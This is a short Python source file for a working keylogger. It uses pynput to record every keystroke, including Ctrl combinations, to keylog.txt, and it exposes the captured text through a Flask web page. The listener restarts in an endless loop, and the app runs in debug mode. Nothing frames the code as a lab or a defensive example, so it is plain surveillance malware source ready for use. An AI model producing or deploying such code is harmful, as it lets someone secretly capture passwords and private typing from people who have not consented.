from flask import Flask, render_template
from pynput.keyboard import Listener, Key
from threading import Thread

app = Flask(__name__)

keys = []
not_to_be_printed = [Key.shift, Key.ctrl, Key.alt, Key.cmd, Key.esc]
ctrl_pressed = False
output_file = 'keylog.txt'

def keyPress(key):
    global ctrl_pressed
    if key == Key.ctrl:
        ctrl_pressed = True
    elif ctrl_pressed:
        keys.append(f'Ctrl+{key}')
        ctrl_pressed = False
    else:
        keys.append(key)
    storeKeysToFile(keys)

def keyRelease(key):
    if key == Key.esc:
        return False

def storeKeysToFile(keys):
    with open(output_file, 'w') as log:
        for the_key in keys:
            if the_key in not_to_be_printed:
                continue
            if the_key == Key.space:
                log.write(' ')

            the_key = str(the_key).replace("'", "")
            log.write(the_key)

def flask_listener():
    with Listener(on_press=keyPress, on_release=keyRelease) as the_listener:
        the_listener.join()

def run_listener():
    while True:
        flask_listener()

@app.route('/')
def index():
    all_keys = ''
    with open(output_file, 'r') as file:
        all_keys = file.read()
    return render_template('index.html', keylog=all_keys)

if __name__ == '__main__':
    listener_thread = Thread(target=run_listener)
    listener_thread.start()
    app.run(debug=True)